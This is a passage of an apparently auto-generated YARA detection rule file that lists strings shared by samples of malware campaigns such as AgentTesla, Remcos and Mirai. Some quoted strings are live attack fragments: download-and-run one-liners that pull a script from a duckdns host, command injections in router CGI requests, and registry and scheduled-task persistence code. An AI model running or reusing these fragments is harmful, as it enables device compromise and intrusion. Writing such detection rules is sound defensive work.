        $s7 = "ambiguous syntax (function call x new statement)" ascii
        $s8 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s9 = "attempt to yield across C-call boundary" ascii
        $s10 = "  -j cmd    Perform LuaJIT control command." ascii
        $s11 = "NYI: cannot call this C function (yet)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1756160 and 12 of them
}

rule Sightlines_tlsh_f4d4c610_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4d4c610"
        date = "2026-10-22"
        campaign = "tlsh-f4d4c610"
        family = ""
        hash = "0141e546ec16e5a2d0aac816932506aca117c3c59c7cc4d933441e1f92267079"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4d4c610.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s1 = "  -O[opt]   Control LuaJIT optimizations." ascii
        $s2 = "unknown or malformed optimization flag '%s'" ascii
        $s3 = "unknown luaJIT command or jit.* modules not installed" ascii
        $s4 = "PANIC: unprotected error in call to Lua API (" ascii
        $s5 = "ambiguous syntax (function call x new statement)" ascii
        $s6 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s7 = "attempt to yield across C-call boundary" ascii
        $s8 = "  -j cmd    Perform LuaJIT control command." ascii
        $s9 = "NYI: cannot call this C function (yet)" ascii
        $s10 = "wrong number of arguments for function call" ascii
        $s11 = "runtime code generation failed, restricted kernel?" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1520640 and 12 of them
}

rule Sightlines_tlsh_ae5eb87f_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ae5eb87f"
        date = "2026-10-21"
        campaign = "tlsh-ae5eb87f"
        family = "agenttesla"
        hash = "6772c041440cf1f4fb5e6590bfd3e5902a6080aa46e4131277f22f33ca702e32"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ae5eb87f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " \"$&(*,.02468:<>@BDFHJLNPRTVXZ\\^`bdfhjlnprtvxz|~" ascii
        $s1 = "      <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCod" ascii
        $s2 = "80},\"CardTableInfo\":{\"!\":24,\"Recount\":0,\"Size\":8,\"NextCardTable\":16},\"RegionFreeList\":{\"!\":56,\"HeadF" ascii
        $s3 = "served\":16,\"Allocated\":24,\"GcIndex\":32,\"Fgm\":40,\"Size\":48,\"AvailablePagefileMb\":56,\"LohP\":64},\"Handl" ascii
        $s4 = "4,\"Mem\":32,\"Flags\":40,\"Next\":48,\"BackgroundAllocated\":56},\"OomHistory\":{\"Reason\":0,\"AllocSize\":8,\"Re" ascii
        $s5 = "egionKinds\":\"0x3\",\"GCHeapMarkArray\":[[1],\"pointer\"],\"GCHeapNextSweepObj\":[[2],\"pointer\"],\"GCHeapBack" ascii
        $s6 = "},\"TableSegment\":{\"NextSegment\":1998,\"RgAllocation\":480,\"RgTail\":1920,\"RgValue\":4096,\"RgUserData\":16" ascii
        $s7 = "ismBitsLength\":\"0x2\",\"GlobalMechanismsLength\":\"0x6\",\"InitialHandleTableArraySize\":\"0xa\",\"DebugDestro" ascii
        $s8 = "alTypes\":\"0xd\",\"HandlesPerBlock\":\"0x40\",\"BlockInvalid\":\"0xff\",\"CardTableInfoSize\":\"0x18\",\"CountFreeR" ascii
        $s9 = "groundMinSavedAddr\":[[3],\"pointer\"],\"GCHeapBackgroundMaxSavedAddr\":[[4],\"pointer\"],\"GCHeapAllocAlloc" ascii
        $s10 = "ExpandMechanisms\":[[13],\"pointer\"],\"GCHeapInterestingMechanismBits\":[[14],\"pointer\"],\"GCHeapFreeable" ascii
        $s11 = "  <assemblyIdentity type=\"win32\" name=\"Citrine.DesktopUtility\" version=\"3.2.0.0\" processorArchitectu" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4482948 and 12 of them
}

rule Sightlines_tlsh_1dcf6ece_coinminer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1dcf6ece"
        date = "2026-10-22"
        campaign = "tlsh-1dcf6ece"
        family = "coinminer"
        hash = "5ac1dd086e6a9daa69b7c44d0820ea16e93dc0cd34392cacda3de6a9aa3c3104"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1dcf6ece.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER$ByReference.classPK" ascii
        $s1 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_SERIALIZED_INFO$ByReference.classPK" ascii
        $s2 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE$ByReference.c" ascii
        $s3 = "com/sun/jna/platform/win32/Winevt$EVT_CHANNEL_CONFIG_PROPERTY_ID.classPK" ascii
        $s4 = "com/sun/jna/platform/win32/WinCrypt$CERT_STRONG_SIGN_PARA$DUMMYUNION.classPK" ascii
        $s5 = "com/sun/jna/platform/win32/Winevt$EVT_SUBSCRIBE_NOTIFY_ACTION.classPK" ascii
        $s6 = "com/sun/jna/platform/win32/HighLevelMonitorConfigurationAPI$MC_DISPLAY_TECHNOLOGY_TYPE.classPK" ascii
        $s7 = "com/sun/jna/platform/win32/WinCrypt$CERT_CHAIN_POLICY_STATUS$ByReference.classPK" ascii
        $s8 = "com/sun/jna/platform/win32/Winsvc$SERVICE_FAILURE_ACTIONS$ByReference.classPK" ascii
        $s9 = "com/sun/jna/platform/win32/WinCrypt$CRYPT_ALGORITHM_IDENTIFIER.classPK" ascii
        $s10 = "com/sun/jna/platform/win32/COM/Wbemcli$WBEM_CONDITION_FLAG_TYPE.classPK" ascii
        $s11 = "com/sun/jna/platform/win32/Winevt$EVT_PUBLISHER_METADATA_PROPERTY_ID.classPK" ascii
    condition:
        filesize < 7954246 and 12 of them
}

rule Sightlines_imphash_4013fc57_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4013fc57"
        date = "2026-10-22"
        campaign = "imphash-4013fc57"
        family = ""
        hash = "03a6e069a3af6c9905293868668280bac89d024e00c99e4313515a4f5f038401"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4013fc57.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "bad FPU precision (use D3DCREATE_FPU_PRESERVE with DirectX)" ascii
        $s1 = "JIT compiler disabled, CPU does not support SSE2" ascii
        $s2 = "unknown or malformed optimization flag '%s'" ascii
        $s3 = "PANIC: unprotected error in call to Lua API (" ascii
        $s4 = "Must use luaL_newstate() for 64 bit target" ascii
        $s5 = "ambiguous syntax (function call x new statement)" ascii
        $s6 = "<goto %s> jumps into the scope of local '%s'" ascii
        $s7 = "attempt to yield across C-call boundary" ascii
        $s8 = "NYI: cannot call this C function (yet)" ascii
        $s9 = "wrong number of arguments for function call" ascii
        $s10 = "runtime code generation failed, restricted kernel?" ascii
        $s11 = "attempt to perform arithmetic on '%s' and '%s'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_484af3db_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-484af3db"
        date = "2026-10-22"
        campaign = "tlsh-484af3db"
        family = ""
        hash = "0b24132bc1794daf323a3ce5ae8f5f14de7a161ab778fa89192514aa1b6966cf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-484af3db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "function FindProxyForURL(url,host) {return \"DIRECT\";}" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "WPADAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS" wide
        $s3 = "DNSHost must be specified and fully qualified when using DNSTypes SOA or SRV" wide
        $s4 = "HTTPAuth value must be Anonymous, Basic, NTLM, or NTLMNoESS" wide
        $s5 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s6 = "ProxyAuth value must be Basic, NTLM, or NTLMNoESS" wide
        $s7 = " -WPADAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authe" wide
        $s8 = " -MachineAccounts         Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response c" wide
        $s9 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s10 = "[-] Error starting unprivileged {1} listener, check IP and port usage." wide
        $s11 = " -HTTPAuth                Default = NTLM: (Anonymous/Basic/NTLM/NTLMNoESS) HTTP/HTTPS listener authe" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_8ae6d067_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-8ae6d067"
        date = "2026-10-22"
        campaign = "imphash-8ae6d067"
        family = ""
        hash = "072960b06dcec0b5d0991f98ff8b6bb90aa75ec4d0bf3ed7f58f1984ebc1dea4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-8ae6d067.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (MinGW-W64 x86_64-ucrt-posix-seh, built by Brecht Sanders, r1) 16.2.0" ascii
        $s1 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">" ascii
        $s2 = " <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "    <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s4 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s6 = "   <longPathAware>true</longPathAware>" ascii
        $s7 = "Partial loss of significance (PLOSS)" ascii
        $s8 = "Total loss of significance (TLOSS)" ascii
        $s9 = "api-ms-win-crt-private-l1-1-0.dll" ascii
        $s10 = "Overflow range error (OVERFLOW)" ascii
        $s11 = "Argument domain error (DOMAIN)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 18874368 and 12 of them
}

rule Sightlines_tlsh_a5222893_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5222893"
        date = "2026-10-22"
        campaign = "tlsh-a5222893"
        family = ""
        hash = "6b9df966d5f851687534c1abae51e4287c91484fa5aa6dc45e89ebb8368a02e7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5222893.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "0x164},H=a0y;return'webdriver'in window||!!a0X[H(a0z.M)];},'userAgentCheck':function(){var a0Y={M:0x" ascii
        $s1 = "149,G:0x170},S=a0y;return/headless|bytespider/i[S(a0Y.M)](a0X[S(a0Y.G)]);},'appVersionCheck':functio" ascii
        $s2 = "0W.M)]||a0X[L(0x147)][L(0x142)]===0x0;},'zeroOuterDimensions':function(){var a0p={M:0x16b},x=a0y;ret" ascii
        $s3 = "n(){var a0h={M:0x15c},u=a0y;return/headless/i[u(0x149)](a0X[u(a0h.M)]);},'pluginArraySpoofing':funct" ascii
        $s4 = "(function(M,G){var a0R={M:0x15a,G:0x162,J:0x14e,y:0x153},s=a0y,J=M();while(!![]){try{var y=-parseInt" ascii
        $s5 = ")];return!M;},'mimeTypeArraySpoofing':function(){var a0K={M:0x154,G:0x177},I=a0y;let M=MimeTypeArray" ascii
        $s6 = ":0x146,n:0x172,N:0x148,b:0x160,o:0x156,R:0x175};setTimeout(function(){var q=a0y,M=window['document']" ascii
        $s7 = "urn window[x(a0p.M)+'t']===0x0&&window['outerWidth']===0x0;}},a0F=function(J,y){var a0f={M:0x179,G:0" ascii
        $s8 = "ion(){var a0Z={M:0x177,G:0x142,J:0x177,y:0x14d,X:0x154},t=a0y;let M=PluginArray[t(a0Z.M)]===a0X['plu" ascii
        $s9 = "['shift']());}}}(a0J,0x9d547));function a0y(M,G){var J=a0J();return a0y=function(y,X){y=y-0x13e;var " ascii
        $s10 = "X[I(0x176)][0x0][I(0x154)];return!M;},'noLanguage':function(){var a0W={M:0x144},L=a0y;return!a0X[L(a" ascii
        $s11 = "nction(B,E){var a0v={M:0x141},a=F?function(){var P=a0y;if(E){var C=E[P(a0v.M)](B,arguments);return E" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ded88d77_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ded88d77"
        date = "2026-10-22"
        campaign = "tlsh-ded88d77"
        family = "remcos"
        hash = "0fe0003258d6d152e026cbde6bb73b6fb427c438a94e1876f514c845ac5068e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ded88d77.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "// SIG // BgEEAYI3AgEeMCQCAQEEEBDgyQbOONQRoqMAEEvTUJAC" ascii
        $s1 = "// SIG // hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor" ascii
        $s2 = "// SIG // AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg" ascii
        $s3 = "// SIG // Begin signature block" ascii
        $s4 = "// SIG // End signature block" ascii
    condition:
        filesize < 1048576 and 5 of them
}

rule Sightlines_dotnet_typelib_guid_788d52d8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-788d52d8"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-788d52d8"
        family = ""
        hash = "13cee49212b02538acec3887804d62cd696f29cbe37e5231809f16f384619be9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-788d52d8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Couldnt set the shellcode memory as PAGE_EXECUTE_READWRITE!" wide
        $s1 = "AntiAnalysis: Suspicious Machine GUID detected! Self-destructing..." wide
        $s2 = "SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet" wide
        $s3 = "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command" wide
        $s4 = "\\NETGATE Technologies\\BlackHawk\\Profiles" wide
        $s5 = "AntiAnalysis: Suspicious GPU detected! Self-destructing..." wide
        $s6 = "AntiAnalysis: Suspicious PC name detected! Self-destructing..." wide
        $s7 = "AntiAnalysis: Failed to retrieve Machine GUID. Exception: " wide
        $s8 = "AntiAnalysis: Suspicious PC username detected! Self-destructing..." wide
        $s9 = "HARDWARE\\Description\\System\\CentralProcessor\\0" wide
        $s10 = "AntiAnalysis: Suspicious IP detected! Self-destructing..." wide
        $s11 = "SystemPortableWorkspaceEfiLauncherInformation" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4016128 and 12 of them
}

rule Sightlines_tlsh_bd96c2c5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bd96c2c5"
        date = "2026-10-22"
        campaign = "tlsh-bd96c2c5"
        family = ""
        hash = "408bed94fb0961193dbea6bebc82b9a8ff5fe645e9dd5a095296969e55757c27"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bd96c2c5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "                'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\' + CONFIG.REG_VALUE_NAME," ascii
        $s1 = "            taskService.GetFolder('\\\\').GetTask(CONFIG.TASK_NAME);" ascii
        $s2 = "        var path = CONFIG.TEMP_DIR + randomName(CONFIG.SCRIPT_EXT);" ascii
        $s3 = "    var fso = new ActiveXObject('Scripting.FileSystemObject');" ascii
        $s4 = "        if (fso.FolderExists(CONFIG.TEMP_DIR)) return true;" ascii
        $s5 = "    var wsh = new ActiveXObject('WScript.Shell');" ascii
        $s6 = "        REG_VALUE_NAME: 'SystemHealthMonitor'," ascii
        $s7 = "        var xhr = new ActiveXObject('MSXML2.XMLHTTP');" ascii
        $s8 = "            def.RegistrationInfo.Description = CONFIG.DESCRIPTION;" ascii
        $s9 = "        DESCRIPTION: 'Windows System Maintenance Utility'" ascii
        $s10 = "    function registerScheduledTask(scriptPath) {" ascii
        $s11 = "    var taskService = new ActiveXObject('Schedule.Service');" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_561d82e2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-561d82e2"
        date = "2026-10-22"
        campaign = "dotnet_typelib_guid-561d82e2"
        family = ""
        hash = "0f0bdd9f64eea46f1e78279189cc709473c10b1a5b5e405c42791a8babfd4811"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-561d82e2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "`Gets or sets the SWN p value (probability of casual) for switching algorithm (Floyd 0--p--1 BFS)" ascii
        $s2 = "CThe third parameter of the distribution (shape c, xMin, xMax, k, v)" ascii
        $s3 = "]The probability of transmission per single sexual intercourse from Male to Male, (homosexual)" ascii
        $s4 = "2The fourth parameter of the distribution (xMax, w)" ascii
        $s5 = "7Is the group's population (graph vertices) initialised." ascii
        $s6 = "%System.Globalization.NumberFormatInfo!" ascii
        $s7 = "jThe second parameter of the distribution. (scale b, shape c, xMin, xMax, degree of freedom df, d, p" ascii
        $s8 = "_Gets or sets the maximum size for numerical calculation of the network efficiency (path length)" ascii
        $s9 = "]Gets or sets the number of initial infected individuals for Temporal and Conditional warm-up." ascii
        $s10 = "VGets or sets the probability of concurrent partnerships during the simulation warm-up." ascii
        $s11 = "2Gets or Sets the simulation warm-up configuration." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 5315584 and 12 of them
}

rule Sightlines_imphash_fe474526_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-fe474526"
        date = "2026-10-22"
        campaign = "imphash-fe474526"
        family = ""
        hash = "1d50b83cbb74f6f7ca0498005ae1391405766b67e20b9ea521a3fc8006826d87"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-fe474526.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "D:\\Projects\\pay\\tools\\wework_loader_go\\downloads\\zstd-src\\zstd-1.5.6\\lib\\dictBuilder\\divsufsort.c" wide
        $s1 = "WARNING: The maximum dictionary size %u is too large compared to the source size %u! size(source)/si" ascii
        $s2 = "warning : ZSTD_compressBegin_usingCDict failed " ascii
        $s3 = "ze(dictionary) = %f, but it should be >= 10! This may lead to a subpar dictionary! We recommend trai" ascii
        $s4 = "?Draw@CxImage@@QAEJPAUHDC__@@JJJJPAUtagRECT@@_N@Z" ascii
        $s5 = "!  consider increasing the number of samples (total size : %u MB)" ascii
        $s6 = "FASTCOVER must have at least one input file" ascii
        $s7 = "ning on sources at least 10x, and preferably 100x the size of the dictionary! " ascii
        $s8 = "Selected dict at position %u, of length %u : saves %u (ratio: %.2f)  " ascii
        $s9 = "FSE_normalizeCount error with matchLengthCount " ascii
        $s10 = "!  warning : selected content significantly smaller than requested (%u < %u) " ascii
        $s11 = "ZSTD_CCtxParams_registerSequenceProducer" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1252352 and 12 of them
}

rule Sightlines_imphash_1aa37283_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1aa37283"
        date = "2026-10-22"
        campaign = "imphash-1aa37283"
        family = ""
        hash = "00eb23895750f2ea8aa5dae08aa7120846404596f1ade0b142461597b4157ffe"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1aa37283.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show($env:SERO_MSG,'Notifi" wide
        $s1 = "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;" wide
        $s2 = "@<EstablishProxyTunnelAsync>d__576<EstablishSocksTunnel>d__58:<HandleHttp11Downgrade>d__105J<InjectN" ascii
        $s3 = "[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;" wide
        $s4 = ".<>c__DisplayClass68_0`1\"<get_Claims>d__914AllowedBmpCodePointsBitmap2OptimizedInboxTextEncoder0Defa" ascii
        $s5 = "r<<GetAddrInfoWithTelemetryAsync>g__CompleteAsync|35_0>d`1.<>c__DisplayClass40_0`1$GetAddrInfoExStat" ascii
        $s6 = "Z<WaitForExitAsync>g__WaitUntilOutputEOF|186_1Z<GetProcessHandlePairs>g__SafeGetHandle|273_0" ascii
        $s7 = "[WinApi]::EnumDisplaySettings([System.IntPtr]::Zero,-1,[ref]$dm)|Out-Null;" wide
        $s8 = "J<CleanCacheAndDisposeIfUnused>b__65_0,<HandleAltSvc>b__138_08TryGetChallengeDataForScheme" ascii
        $s9 = "$f.Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Perf" wide
        $s10 = "@<FlushAsyncInternal>g__Core|79_0j<ThrowIfDisposed>g__ThrowObjectDisposedException|80_0" ascii
        $s11 = "H<IsPreamble>g__IsPreambleWorker|57_0j<ThrowIfDisposed>g__ThrowObjectDisposedException|73_0@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17805312 and 12 of them
}

rule Sightlines_contacted_96645a0d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-96645a0d"
        date = "2026-10-22"
        campaign = "contacted-96645a0d"
        family = ""
        hash = "24294bb46842f08d3f37989de1f47d0aef9eaffa1fc9eea3ceda173702978641"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-96645a0d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s1 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s2 = "Partial loss of significance (PLOSS)" ascii
        $s3 = "api-ms-win-crt-multibyte-l1-1-0.dll" ascii
        $s4 = "Total loss of significance (TLOSS)" ascii
        $s5 = "Overflow range error (OVERFLOW)" ascii
        $s6 = "Argument domain error (DOMAIN)" ascii
        $s7 = "Argument singularity (SIGN)" ascii
        $s8 = "runtime error %d" ascii
        $s9 = "client32.exe" ascii
        $s10 = ":MZurLcB<B" ascii
        $s11 = "_ismbblead" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12253184 and 12 of them
}

rule Sightlines_contacted_0224a947_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-0224a947"
        date = "2026-10-23"
        campaign = "contacted-0224a947"
        family = ""
        hash = "503225b031ced0ed5573439c14fcdc9116b4e0661f1b557b86f84d046f172803"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-0224a947.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "crosoft.com/SMI/2020/WindowsSettings\"><heapType>SegmentHeap</heapType></asmv3:windowsSettings></asmv" ascii
        $s1 = "3:application></assembly>" ascii
        $s2 = "invalid random_device value" ascii
        $s3 = "@SUVWAVHcA" ascii
        $s4 = "D$ H3L$ H3" ascii
        $s5 = "D$HL9wXt" ascii
        $s6 = "L$HH1D$ " ascii
        $s7 = "UVAUAVAWI" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 8 of them
}

rule Sightlines_contacted_1414726c_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-1414726c"
        date = "2026-11-01"
        campaign = "contacted-1414726c"
        family = "mirai"
        hash = "224c706b55f8f69848aae5be171fc4df1e84325520bdd6ecde5f752f80341aa4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-1414726c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s1 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s2 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s3 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s4 = "d())\" 2>/dev/null||python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://mantac2.duc" ascii
        $s5 = "tac2.duckdns.org\\r\\n\\r\\n'|nc mantac2.duckdns.org 80 2>/dev/null|sed '1,/^\\r*$/d'|sh)2>/dev/null||per" ascii
        $s6 = "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"" ascii
        $s7 = "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"" ascii
        $s8 = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-%s.tar.gz" ascii
        $s9 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q" ascii
        $s10 = "Accept-Encoding: gzip, deflate, br, zstd" ascii
        $s11 = "systemctl daemon-reload 2>/dev/null; systemctl enable manta.service 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3604336 and 12 of them
}

rule Sightlines_tlsh_1fa020be_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1fa020be"
        date = "2026-10-20"
        campaign = "tlsh-1fa020be"
        family = "mirai"
        hash = "1f033b961e57f63b7dc2735bb21abebd94ebca07c2b2b08068f0faf8af18623f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1fa020be.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "WireGuard v1 zx2c4 Jason@zx2c4.comNoise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s5 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s7 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s8 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s10 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s11 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_4e2a2ff6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4e2a2ff6"
        date = "2026-10-17"
        campaign = "tlsh-4e2a2ff6"
        family = ""
        hash = "30a27eaf23cbec3ad0817f339ac43655aed23c96d047d0791d5d8a5db1fba2a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4e2a2ff6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        'W47dN09jW4nAhSkkBvLJzCoAlu9lW5dcQ3KhjWNcL1nvWRjuW5H7nZddVCoPW6rlvCkWWQG'," ascii
        $s1 = "        'yCo6W6LbW73dUbBcPSkHWQNdTCo7W5VcVcZcHLBcLSk6W6NdRNddS8kYW5ZdKwXokCoIWQjgW4uLr1TRW5O'," ascii
        $s2 = "_0x14d7c0] = _0x38d82e, _0x3821ba += String['fromCharCode'](_0x1daf17['charCodeAt'](_0x3479ca) ^ _0x" ascii
        $s3 = "        'wdFdP27cO0RcL8oLiSo7n2b0BmkkzCk0W5KNW5ldR8k1W7/cTfvy'," ascii
        $s4 = "0x1140ba, _0x242679++ % 0x4) ? _0x238764 += String['fromCharCode'](0xff & _0x11774c >> (-0x2 * _0x24" ascii
